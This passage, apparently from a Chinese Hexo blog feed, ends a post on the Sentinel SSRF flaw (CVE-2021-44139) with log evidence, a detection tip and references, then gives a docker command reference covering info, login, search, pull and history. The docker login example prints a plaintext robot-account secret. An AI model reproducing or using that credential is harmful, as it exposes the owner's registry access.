class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654348000&amp;endTime=1708654354000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">57.904</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654355000&amp;endTime=1708654361000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">14</span>:<span class="hljs-number">04.864</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654362000&amp;endTime=1708654368000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">14</span>:<span class="hljs-number">11.860</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654369000&amp;endTime=1708654375000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">14</span>:<span class="hljs-number">18.860</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654376000&amp;endTime=1708654382000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><br></code></pre></td></tr></table></figure><h3 id="控制台"><a href="#控制台" class="headerlink" title="控制台"></a>控制台</h3><p>检查 控制台-&gt;机器列表中是否存在未知异常的机器信息</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] Report a Sentinel Security Vulnerability about SSRF #2451 threedr3am Nov 18, 2021<br>链接：<a href="https://github.com/alibaba/Sentinel/issues/2451">https://github.com/alibaba/Sentinel/issues/2451</a></p><p>[2] Alibaba Sentinel SSRF漏洞(CVE-2021-44139)浅析 ordar 2022-08-30</p><p>链接：<a href="https://mrwq.github.io/aggregate-paper/butian/Alibaba%20Sentinel%20SSRF%E6%BC%8F%E6%B4%9E(CVE-2021-44139)%E6%B5%85%E6%9E%90/">https://mrwq.github.io/aggregate-paper/butian/Alibaba%20Sentinel%20SSRF%E6%BC%8F%E6%B4%9E(CVE-2021-44139)%E6%B5%85%E6%9E%90/</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
      <category>yunweivulns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>yunweivulns</tag>
      
      <tag>ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_install</title>
    <link href="/2024/02/20/yunwei/applications/docker/docker_install/"/>
    <url>/2024/02/20/yunwei/applications/docker/docker_install/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><h2 id="install"><a href="#install" class="headerlink" title="install"></a>install</h2><h3 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h3><h4 id="安装指定版本docker"><a href="#安装指定版本docker" class="headerlink" title="安装指定版本docker"></a>安装指定版本docker</h4><h5 id="安装基础环境"><a href="#安装基础环境" class="headerlink" title="安装基础环境"></a>安装基础环境</h5><h3 id="redhat"><a href="#redhat" class="headerlink" title="redhat"></a>redhat</h3><h3 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h3><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><h2 id="uninstall"><a href="#uninstall" class="headerlink" title="uninstall"></a>uninstall</h2><h3 id="ubuntu-1"><a href="#ubuntu-1" class="headerlink" title="ubuntu"></a>ubuntu</h3><h3 id="redhat-1"><a href="#redhat-1" class="headerlink" title="redhat"></a>redhat</h3><h3 id="mac-1"><a href="#mac-1" class="headerlink" title="mac"></a>mac</h3><h3 id="windows-1"><a href="#windows-1" class="headerlink" title="windows"></a>windows</h3>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_command</title>
    <link href="/2024/02/20/yunwei/applications/docker/docker_command/"/>
    <url>/2024/02/20/yunwei/applications/docker/docker_command/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>命令基于 mac Docker Desktop 4.11.1 (84025) </p><h1 id="docker服务"><a href="#docker服务" class="headerlink" title="docker服务"></a>docker服务</h1><h2 id="查看服务"><a href="#查看服务" class="headerlink" title="查看服务"></a>查看服务</h2><h3 id="docker-info"><a href="#docker-info" class="headerlink" title="docker info"></a>docker info</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">➜</span>  <span class="hljs-string">test</span> <span class="hljs-string">docker</span> <span class="hljs-string">info</span><br><span class="hljs-attr">Client:</span><br> <span class="hljs-attr">Context:</span>    <span class="hljs-string">default</span><br> <span class="hljs-attr">Debug Mode:</span> <span class="hljs-literal">false</span><br> <span class="hljs-attr">Plugins:</span><br>  <span class="hljs-attr">buildx:</span> <span class="hljs-string">Docker</span> <span class="hljs-string">Buildx</span> <span class="hljs-string">(Docker</span> <span class="hljs-string">Inc.,</span> <span class="hljs-string">v0.8.2)</span><br>  <span class="hljs-attr">compose:</span> <span class="hljs-string">Docker</span> <span class="hljs-string">Compose</span> <span class="hljs-string">(Docker</span> <span class="hljs-string">Inc.,</span> <span class="hljs-string">v2.7.0)</span><br>  <span class="hljs-attr">extension:</span> <span class="hljs-string">Manages</span> <span class="hljs-string">Docker</span> <span class="hljs-string">extensions</span> <span class="hljs-string">(Docker</span> <span class="hljs-string">Inc.,</span> <span class="hljs-string">v0.2.8)</span><br>  <span class="hljs-attr">sbom:</span> <span class="hljs-string">View</span> <span class="hljs-string">the</span> <span class="hljs-string">packaged-based</span> <span class="hljs-string">Software</span> <span class="hljs-string">Bill</span> <span class="hljs-string">Of</span> <span class="hljs-string">Materials</span> <span class="hljs-string">(SBOM)</span> <span class="hljs-string">for</span> <span class="hljs-string">an</span> <span class="hljs-string">image</span> <span class="hljs-string">(Anchore</span> <span class="hljs-string">Inc.,</span> <span class="hljs-number">0.6</span><span class="hljs-number">.0</span><span class="hljs-string">)</span><br>  <span class="hljs-attr">scan:</span> <span class="hljs-string">Docker</span> <span class="hljs-string">Scan</span> <span class="hljs-string">(Docker</span> <span class="hljs-string">Inc.,</span> <span class="hljs-string">v0.17.0)</span><br><br><span class="hljs-attr">Server:</span><br> <span class="hljs-attr">Containers:</span> <span class="hljs-number">10</span><br>  <span class="hljs-attr">Running:</span> <span class="hljs-number">2</span><br>  <span class="hljs-attr">Paused:</span> <span class="hljs-number">0</span><br>  <span class="hljs-attr">Stopped:</span> <span class="hljs-number">8</span><br> <span class="hljs-attr">Images:</span> <span class="hljs-number">14</span><br> <span class="hljs-attr">Server Version:</span> <span class="hljs-number">20.10</span><span class="hljs-number">.17</span><br> <span class="hljs-attr">Storage Driver:</span> <span class="hljs-string">overlay2</span><br>  <span class="hljs-attr">Backing Filesystem:</span> <span class="hljs-string">extfs</span><br>  <span class="hljs-attr">Supports d_type:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">Native Overlay Diff:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">userxattr:</span> <span class="hljs-literal">false</span><br> <span class="hljs-attr">Logging Driver:</span> <span class="hljs-string">json-file</span><br> <span class="hljs-attr">Cgroup Driver:</span> <span class="hljs-string">cgroupfs</span><br> <span class="hljs-attr">Cgroup Version:</span> <span class="hljs-number">2</span><br> <span class="hljs-attr">Plugins:</span><br>  <span class="hljs-attr">Volume:</span> <span class="hljs-string">local</span><br>  <span class="hljs-attr">Network:</span> <span class="hljs-string">bridge</span> <span class="hljs-string">host</span> <span class="hljs-string">ipvlan</span> <span class="hljs-string">macvlan</span> <span class="hljs-literal">null</span> <span class="hljs-string">overlay</span><br>  <span class="hljs-attr">Log:</span> <span class="hljs-string">awslogs</span> <span class="hljs-string">fluentd</span> <span class="hljs-string">gcplogs</span> <span class="hljs-string">gelf</span> <span class="hljs-string">journald</span> <span class="hljs-string">json-file</span> <span class="hljs-string">local</span> <span class="hljs-string">logentries</span> <span class="hljs-string">splunk</span> <span class="hljs-string">syslog</span><br> <span class="hljs-attr">Swarm:</span> <span class="hljs-string">inactive</span><br> <span class="hljs-attr">Runtimes:</span> <span class="hljs-string">runc</span> <span class="hljs-string">io.containerd.runc.v2</span> <span class="hljs-string">io.containerd.runtime.v1.linux</span><br> <span class="hljs-attr">Default Runtime:</span> <span class="hljs-string">runc</span><br> <span class="hljs-attr">Init Binary:</span> <span class="hljs-string">docker-init</span><br> <span class="hljs-attr">containerd version:</span> <span class="hljs-string">10c12954828e7c7c9b6e0ea9b0c02b01407d3ae1</span><br> <span class="hljs-attr">runc version:</span> <span class="hljs-string">v1.1.2-0-ga916309</span><br> <span class="hljs-attr">init version:</span> <span class="hljs-string">de40ad0</span><br> <span class="hljs-attr">Security Options:</span><br>  <span class="hljs-string">seccomp</span><br>   <span class="hljs-attr">Profile:</span> <span class="hljs-string">default</span><br>  <span class="hljs-string">cgroupns</span><br> <span class="hljs-attr">Kernel Version:</span> <span class="hljs-number">5.10</span><span class="hljs-number">.104</span><span class="hljs-string">-linuxkit</span><br> <span class="hljs-attr">Operating System:</span> <span class="hljs-string">Docker</span> <span class="hljs-string">Desktop</span><br> <span class="hljs-attr">OSType:</span> <span class="hljs-string">linux</span><br> <span class="hljs-attr">Architecture:</span> <span class="hljs-string">aarch64</span><br> <span class="hljs-attr">CPUs:</span> <span class="hljs-number">4</span><br> <span class="hljs-attr">Total Memory:</span> <span class="hljs-number">3.</span><span class="hljs-string">841GiB</span><br> <span class="hljs-attr">Name:</span> <span class="hljs-string">docker-desktop</span><br> <span class="hljs-attr">ID:</span> <span class="hljs-string">4PPK:ZEQN:27ZX:7RDL:BASL:RHIO:UZXN:DTSX:UHWP:HBFU:2DYI:EJRN</span><br> <span class="hljs-attr">Docker Root Dir:</span> <span class="hljs-string">/var/lib/docker</span><br> <span class="hljs-attr">Debug Mode:</span> <span class="hljs-literal">false</span><br> <span class="hljs-attr">HTTP Proxy:</span> <span class="hljs-string">http.docker.internal:3128</span><br> <span class="hljs-attr">HTTPS Proxy:</span> <span class="hljs-string">http.docker.internal:3128</span><br> <span class="hljs-attr">No Proxy:</span> <span class="hljs-string">hubproxy.docker.internal</span><br> <span class="hljs-attr">Registry:</span> <span class="hljs-string">https://index.docker.io/v1/</span><br> <span class="hljs-attr">Labels:</span><br> <span class="hljs-attr">Experimental:</span> <span class="hljs-literal">false</span><br> <span class="hljs-attr">Insecure Registries:</span><br>  <span class="hljs-string">hubproxy.docker.internal:5000</span><br>  <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-string">/8</span><br> <span class="hljs-attr">Registry Mirrors:</span><br>  <span class="hljs-string">https://zp98nloz.mirror.aliyuncs.com/</span><br> <span class="hljs-attr">Live Restore Enabled:</span> <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><h1 id="镜像仓库"><a href="#镜像仓库" class="headerlink" title="镜像仓库"></a>镜像仓库</h1><h2 id="登录镜像仓库"><a href="#登录镜像仓库" class="headerlink" title="登录镜像仓库"></a>登录镜像仓库</h2><h3 id="docker-login"><a href="#docker-login" class="headerlink" title="docker login"></a>docker login</h3><p><strong>docker login [OPTIONS] [SERVER] [flags]</strong></p><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h4><p>以用户名&#x2F;密码或机器人账户&#x2F;密钥方式登录指定镜像仓库</p><h4 id="SERVER"><a href="#SERVER" class="headerlink" title="SERVER"></a>SERVER</h4><p>指定镜像仓库地址，例如：hub.xxx.com</p><h4 id="Flags"><a href="#Flags" class="headerlink" title="Flags"></a>Flags</h4><h5 id="p"><a href="#p" class="headerlink" title="-p"></a>-p</h5><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--password string </span><br></code></pre></td></tr></table></figure><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--password-stdin</span><br></code></pre></td></tr></table></figure><h5 id="u"><a href="#u" class="headerlink" title="-u"></a>-u</h5><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--username string</span><br></code></pre></td></tr></table></figure><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>机器人账户：robot-0207</p><p>机器人密钥：wlRCBQX68DCZIrCHoSAvACm1xpdadTBF</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">➜  test docker <span class="hljs-keyword">login</span> registry.xxx.xxx.com -u robot<span class="hljs-number">-0227</span> -p wlRCBQX68DCZIrCHoSAvACm1xpdadTBF<br><span class="hljs-built_in">WARNING</span>! <span class="hljs-keyword">Using</span> <span class="hljs-comment">--password via the CLI is insecure. Use --password-stdin.</span><br><span class="hljs-keyword">Login</span> Succeeded<br></code></pre></td></tr></table></figure><h2 id="退出镜仓库"><a href="#退出镜仓库" class="headerlink" title="退出镜仓库"></a>退出镜仓库</h2><h3 id="docker-logout"><a href="#docker-logout" class="headerlink" title="docker logout"></a>docker logout</h3><p><strong>docker logout [SERVER] [flags]</strong></p><h4 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h4><p>退出指定镜像仓库</p><h4 id="SERVER-1"><a href="#SERVER-1" class="headerlink" title="SERVER"></a>SERVER</h4><p>指定镜像仓库地址，例如：hub.xxx.com</p><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">➜  <span class="hljs-symbol">~ docker logout</span><br><span class="hljs-symbol">Removing login credentials for https</span>:<span class="hljs-comment">//index.docker.io/v1/</span><br></code></pre></td></tr></table></figure><h1 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h1><h2 id="查询镜像"><a href="#查询镜像" class="headerlink" title="查询镜像"></a>查询镜像</h2><h3 id="docker-search"><a href="#docker-search" class="headerlink" title="docker search"></a>docker search</h3><p><strong>docker search [OPTIONS] TEAM</strong></p><h4 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h4><p>默认官方 Docker Hub （hub.docker.com）查找镜像</p><h4 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="f-–filter-filter"><a href="#f-–filter-filter" class="headerlink" title="-f –filter filter"></a>-f –filter filter</h5><p>Filter output based on conditions provided 根据过滤条件过滤镜像</p><h5 id="–no-trunc"><a href="#–no-trunc" class="headerlink" title="–no-trunc"></a>–no-trunc</h5><p>Don’t truncate output 不截断输出，也就是显示完整的镜像描述</p><h5 id="–limit-ini"><a href="#–limit-ini" class="headerlink" title="–limit ini"></a>–limit ini</h5><p>Max number of search results (default 25) 搜索结果的最大数目(默认25个)</p><h5 id="–format-string"><a href="#–format-string" class="headerlink" title="–format string"></a>–format string</h5><p>Pretty-print search using a Go template</p><h4 id="TEAM"><a href="#TEAM" class="headerlink" title="TEAM"></a>TEAM</h4><p>指定需要查询的镜像名</p><h4 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h4><h5 id="查找镜像名包含memcached且收藏数大于10的镜像"><a href="#查找镜像名包含memcached且收藏数大于10的镜像" class="headerlink" title="查找镜像名包含memcached且收藏数大于10的镜像"></a>查找镜像名包含memcached且收藏数大于10的镜像</h5><p>docker search -f stars&#x3D;10 memcached –no-trunc</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">➜  /tmp docker <span class="hljs-keyword">search</span> -f stars=<span class="hljs-number">10</span> memcached <span class="hljs-comment">--no-trunc</span><br><span class="hljs-type">NAME</span>                       DESCRIPTION                                                                       STARS     OFFICIAL   AUTOMATED<br>memcached                  Free &amp; <span class="hljs-keyword">open</span> source, high-performance, distributed memory <span class="hljs-keyword">object</span> caching <span class="hljs-keyword">system</span>.   <span class="hljs-number">2135</span>      [OK]       <br>bitnami/memcached          Bitnami Memcached Docker Image                                                    <span class="hljs-number">32</span>                   [OK]<br>sylvainlasnier/memcached   Memcached docker images based <span class="hljs-keyword">on</span> Ubuntu <span class="hljs-number">14.10</span>. It <span class="hljs-keyword">is</span> small <span class="hljs-keyword">and</span> basic.             <span class="hljs-number">28</span>                   [OK]<br>rapidfort/memcached-ib     RapidFort optimized, hardened image <span class="hljs-keyword">for</span> Memcached IronBank                        <span class="hljs-number">12</span>                   <br>rapidfort/memcached        RapidFort optimized, hardened image <span class="hljs-keyword">for</span> Memcached                                 <span class="hljs-number">11</span>                   <br>prom/memcached-exporter    Exports metrics <span class="hljs-keyword">from</span> memcached servers <span class="hljs-keyword">for</span> consumption <span class="hljs-keyword">by</span> Prometheus.             <span class="hljs-number">10</span>               <br></code></pre></td></tr></table></figure><p>NAME：镜像名</p><p>DESCRIPTION：描述</p><p>START：关注数</p><p>OFFICIAL：是否为docker官方发布</p><p>AUTOMATED：自动构建</p><h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><h3 id="docker-pull"><a href="#docker-pull" class="headerlink" title="docker pull"></a>docker pull</h3><p><strong>docker pull [OPTIONS] NAME[:TAG|@DIGEST]</strong></p><h4 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h4><p>从镜像仓库中拉取或者更新指定镜像，如不选定版本号，则下载最新镜像</p><h4 id="OPTIONS-1"><a href="#OPTIONS-1" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="a-–all-tags"><a href="#a-–all-tags" class="headerlink" title="-a –all-tags"></a>-a –all-tags</h5><p>拉取所有tagged镜像</p><h5 id="–distable-content-trust"><a href="#–distable-content-trust" class="headerlink" title="–distable-content-trust"></a>–distable-content-trust</h5><p>忽略镜像的校验，默认是开启校验的</p><h4 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h4><p>1、pull命令中的NAME，取决于<a href="https://hub.docker.com/%E4%B8%AD%E6%98%BE%E7%A4%BA%E7%9A%84%E8%BD%AF%E4%BB%B6%E5%90%8D%E3%80%82">https://hub.docker.com/中显示的软件名。</a></p><p>例如：</p><p>下载 mysql 8.3.0 版本，使用 docker pull mysql:8.3.0</p><p>下载 grafana&#x2F;grafana 10.2.4 版本，使用 docker pull grafana&#x2F;grafana:10.2.4 </p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">[root@localhost grafana]<span class="hljs-comment"># docker pull grafana/grafana:6.3.3</span><br><span class="hljs-number">6.3</span><span class="hljs-number">.3</span>: Pulling <span class="hljs-keyword">from</span> grafana/grafana<br>[root@localhost grafana]<span class="hljs-comment"># docker pull grafana/grafana:8.2.6</span><br><span class="hljs-number">8.2</span><span class="hljs-number">.6</span>: Pulling <span class="hljs-keyword">from</span> grafana/grafana<br><br>[root@localhost grafana]<span class="hljs-comment"># docker images | grep grafana</span><br>grafana/grafana                                                   <span class="hljs-number">8.2</span><span class="hljs-number">.6</span>     aeeaa96eea83   <span class="hljs-number">5</span> months ago   <span class="hljs-number">253</span>MB<br>grafana/grafana                                                   <span class="hljs-number">6.3</span><span class="hljs-number">.3</span>     a6e14b4109af   <span class="hljs-number">2</span> years ago    <span class="hljs-number">253</span>MB<br></code></pre></td></tr></table></figure><h4 id="实例-3"><a href="#实例-3" class="headerlink" title="实例"></a>实例</h4><p>从 docker hub 下载最新版memcached</p><p>docker pull memcached</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs makefile">(base) root@localhost:~<span class="hljs-comment"># docker pull memcached:latest</span><br><span class="hljs-section">latest: Pulling from library/memcached</span><br><span class="hljs-section">c229119241af: Pull complete </span><br><span class="hljs-section">af2f0309d301: Pull complete </span><br><span class="hljs-section">35783664a727: Pull complete </span><br><span class="hljs-section">a0d63d088cef: Pull complete </span><br><span class="hljs-section">d2f1f521665d: Pull complete </span><br><span class="hljs-section">24f6b2ace768: Pull complete </span><br><span class="hljs-section">Digest: sha256:c42541495ec1a6925cb105635bcafeedf60a56e3b9e4ac8b1afaf6d7851d70b2</span><br><span class="hljs-section">Status: Downloaded newer image for memcached:latest</span><br><span class="hljs-section">docker.io/library/memcached:latest</span><br></code></pre></td></tr></table></figure><h2 id="查看镜像历史"><a href="#查看镜像历史" class="headerlink" title="查看镜像历史"></a>查看镜像历史</h2><h3 id="docker-history"><a href="#docker-history" class="headerlink" title="docker history"></a>docker history</h3><p><strong>docker history [OPTIONS] images</strong></p><h4 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h4><p>查看镜像的历史提交记录信息</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs leaf">➜  /tmp docker history mysql               <br>IMAGE          CREATED        CREATED BY                                      SIZE      COMMENT<br>de7c37d1d5ac   6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  CMD [&quot;mysqld&quot;]               0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  EXPOSE 3306 33060            0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENTRYPOINT [&quot;docker-entry…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span> COPY file:e9c22353a1133b89…   14.2kB    <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  VOLUME [/var/lib/mysql]      0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eux;  microdnf install -y &quot;m…   282MB     <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_SHELL_VERSION=8…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eu;  . /etc/os-release;  &#123;  …   215B      <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eux;  microdnf install -y &quot;m…   183MB     <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eu;  . /etc/os-release;  &#123;  …   246B      <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_VERSION=8.1.0-1…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_MAJOR=innovation   0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  key=&#x27;859BE8D7C586F5384…   3.17kB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  microdnf install -y   …   14.1MB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  arch=&quot;$(uname -m)&quot;;  c…   2.4MB     <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV GOSU_VERSION=1.16        0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  groupadd --system --gi…   2.77kB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  CMD [&quot;/bin/bash&quot;]            0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span> ADD file:49b1f7f2b2558f789…   118MB   <br></code></pre></td></tr></table></figure><h4 id="OPTIONS-2"><a href="#OPTIONS-2" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="H"><a href="#H" class="headerlink" title="-H"></a>-H</h5><p>以可读的方式展示时间镜像信息和时间，默认开启</p><h5 id="q"><a href="#q" class="headerlink" title="-q"></a>-q</h5><p>仅列出提交记录ID</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs vim">➜  /tmp docker <span class="hljs-keyword">history</span> -q mysql<br>de7c37d1d5ac<br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span 